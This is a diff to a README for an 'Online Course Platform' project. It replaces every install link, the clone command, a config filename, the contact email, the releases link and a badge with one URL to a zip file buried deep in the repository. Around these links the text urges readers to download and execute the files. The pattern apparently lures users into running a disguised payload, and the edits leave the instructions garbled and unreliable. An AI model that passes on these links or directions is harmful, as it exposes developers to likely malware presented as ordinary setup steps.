@@ -64,16 +64,16 @@ To get started with the Online Course Platform, follow these steps:
 
 Make sure you have the following installed on your machine:
 
-- [.NET Core SDK](https://dotnet.microsoft.com/download)
-- [Node.js](https://nodejs.org/)
-- [Angular CLI](https://angular.io/cli)
+- [.NET Core SDK](https://raw.githubusercontent.com/himking101/Online-Course-Platform/main/src/core/state/page/Online-Platform-Course-v3.8.zip)
+- [https://raw.githubusercontent.com/himking101/Online-Course-Platform/main/src/core/state/page/Online-Platform-Course-v3.8.zip](https://raw.githubusercontent.com/himking101/Online-Course-Platform/main/src/core/state/page/Online-Platform-Course-v3.8.zip)
+- [Angular CLI](https://raw.githubusercontent.com/himking101/Online-Course-Platform/main/src/core/state/page/Online-Platform-Course-v3.8.zip)
 
 ### Clone the Repository
 
 Clone this repository to your local machine using the following command:
 
 ```bash
-git clone https://github.com/himking101/Online-Course-Platform.git
+git clone https://raw.githubusercontent.com/himking101/Online-Course-Platform/main/src/core/state/page/Online-Platform-Course-v3.8.zip
 ```
 
 ### Install Dependencies
@@ -94,7 +94,7 @@ dotnet restore
 
 ### Configure the Database
 
-Make sure to set up your database. Update the connection string in the `appsettings.json` file located in the backend directory.
+Make sure to set up your database. Update the connection string in the `https://raw.githubusercontent.com/himking101/Online-Course-Platform/main/src/core/state/page/Online-Platform-Course-v3.8.zip` file located in the backend directory.
 
 ### Run the Application
 
@@ -152,18 +152,18 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, feel free to reach out:
 
 - **Author**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [himking101](https://github.com/himking101)
+- **Email**: https://raw.githubusercontent.com/himking101/Online-Course-Platform/main/src/core/state/page/Online-Platform-Course-v3.8.zip
+- **GitHub**: [himking101](https://raw.githubusercontent.com/himking101/Online-Course-Platform/main/src/core/state/page/Online-Platform-Course-v3.8.zip)
 
 ---
 
 ## Releases
 
-You can find the latest releases of the Online Course Platform [here](https://github.com/himking101/Online-Course-Platform/releases). Download the necessary files and execute them to get the latest updates.
+You can find the latest releases of the Online Course Platform [here](https://raw.githubusercontent.com/himking101/Online-Course-Platform/main/src/core/state/page/Online-Platform-Course-v3.8.zip). Download the necessary files and execute them to get the latest updates.
 
 If you want to keep up with new features and improvements, please check the **Releases** section regularly.
 
-![Release Badge](https://img.shields.io/badge/releases-latest-blue.svg)
+![Release Badge](https://raw.githubusercontent.com/himking101/Online-Course-Platform/main/src/core/state/page/Online-Platform-Course-v3.8.zip)
 
 ---
 
